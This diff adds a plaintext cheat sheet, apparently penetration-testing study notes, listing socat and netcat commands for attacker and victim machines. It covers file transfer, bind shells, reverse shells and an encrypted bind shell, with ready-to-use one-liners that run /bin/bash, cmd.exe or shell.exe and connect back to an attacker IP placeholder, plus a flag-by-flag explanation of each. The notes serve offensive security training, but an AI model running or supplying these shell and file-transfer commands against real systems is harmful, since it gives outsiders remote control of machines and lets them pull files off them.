@@ -1,0 +1,187 @@
+****basic connection****
+
+---to listen on your attacker:---
+
+socat - TCP4:{ip}:4444
+
+- : standard input/output STDIO ->transfers data between STDIO (-) and a TCP4 connection
+TCP : protocol type
+4 : ip version (ipv4)
+4444 : port number
+
+
+nc -nv {ip} 4444
+
+-n : Only IP numbers, no DNS names or no resolving for DNS
+-v : for verposity
+4444 : port number
+
+
+---to connect on victim machine:---
+
+socat TCP4-LISTEN:4444 stdout
+
+TCP : protocol type
+4 : ip version (ipv4)
+LISTEN : what to do
+4444 : port number
+stdout : to redirect output on terminal
+
+
+nc -l -p 4444
+
+it is by defualt using TCP protocol and ipv4 - if using UDP: -u
+-l : what to do (listen)
+-p 4444 : port number
+
+
+****file transfer****
+---to listen on your attacker:---
+
+socat TCP4:{ip}:4444, file:sec.txt,create
+
+TCP : protocol type
+4 : ip version (ipv4)
+4444 : port number
+file:sec.txt : file to save transfer result
+create : what to do to the file
+
+
+nc -nv {ip} 4444 > {file.txt}
+
+-n : Only IP numbers, no DNS names or no resolving for DNS
+-v : for verposity
+4444 : port number
+> : to save file to a location
+{file.txt} : file name to be saved to
+
+---to connect on victim machine:---
+
+socat TCP4-LISTEN:4444,fork file:{file.txt}
+
+TCP : protocol type
+4 : ip version (ipv4)
+LISTEN : what to do
+4444 : port number
+fork : sub-proccess
+file:{file.txt} : to transfer file
+
+
+nc -nlvp 4444 < {file.txt}
+
+it is by defualt using TCP protocol and ipv4 - if using UDP: -u
+-n : Only IP numbers, no DNS names or no resolving for DNS
+-l : what to do (listen)
+-v : for verposity
+-p 4444 : port number
+< :  to transfer this file when open connection
+{file.txt} : file name to be transferred 
+
+
+****Bind shell****
+
+---to listen on your attacker:---
+
+socat -d -d - TCP4:{ip}:4444
+
+-d -d : for verbosity of connection
+- : standard input/output STDIO ->transfers data between STDIO (-) and a TCP4 connection
+TCP : protocol type
+4 : ip version (ipv4)
+4444 : port number
+
+
+nc -nv {ip} 4444
+
+-n : Only IP numbers, no DNS names or no resolving for DNS
+-v : for verposity
+4444 : port number
+
+
+---to connect on victim machine:---
+
+socat -d -d TCP4-LISTEN:4444,fork exec:/bin/bash
+
+-d -d : for verbosity of connection
+TCP : protocol type
+4 : ip version (ipv4)
+LISTEN : what to do
+4444 : port number
+fork : sub-proccess
+EXEC:/bin/bash : to execute command
+
+nc -nlvp 4444 -e cmd.exe
+
+it is by defualt using TCP protocol and ipv4 - if using UDP: -u
+-n : Only IP numbers, no DNS names or no resolving for DNS
+-l : what to do (listen)
+-v : for verposity
+-p 4444 : port number
+-e cmd.exe : to execute command cmd.exe
+
+
+****reverse shell****
+
+---to listen on your attacker:---
+
+socat -d -d TCP4-LISTEN:4444
+
+-d -d : for verbosity of connection
+TCP : protocol type
+4 : ip version (ipv4)
+LISTEN : what to do
+4444 : port number
+
+
+nc -nlvp 4444
+
+it is by defualt using TCP protocol and ipv4 - if using UDP: -u
+-n : Only IP numbers, no DNS names or no resolving for DNS
+-l : what to do (listen)
+-v : for verposity
+-p 4444 : port number
+
+
+---to connect on victim machine:---
+
+socat -d -d TCP4:{ip}:4444,fork exec:/bin/bash
+
+-d -d : for verbosity of connection
+- : standard input/output STDIO ->transfers data between STDIO (-) and a TCP4 connection
+TCP : protocol type
+4 : ip version (ipv4)
+{ip} : ip of attacker
+4444 : port number
+exec:/bin/bash : to execute command
+
+
+nc -nv {ip} 4444 -e shell.exe
+
+-n : Only IP numbers, no DNS names or no resolving for DNS
+-v : for verposity
+{ip} : ip of attacker
+4444 : port number
+-e shell.exe : to execute command shell.exe
+
+
+****Encrypted Bind Shell****
+
+---to listen on your attacker:---
+
+socat - OPENSSL:{ip}:4444,verify=0
+
+- : standard input/output STDIO ->transfers data between STDIO (-) and a TCP4 connection
+OPENSSL : protocol type
+4444 : port number
+
+---to connect on victim machine:---
+
+socat -d -d OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0,fork exec:/bin/bash
+
+-d -d : for verbosity of connection
+TCP : protocol type
+4 : ip version (ipv4)
+LISTEN : what to do
+4444 : port number
+fork : sub-proccess
+EXEC:/bin/bash : to execute command
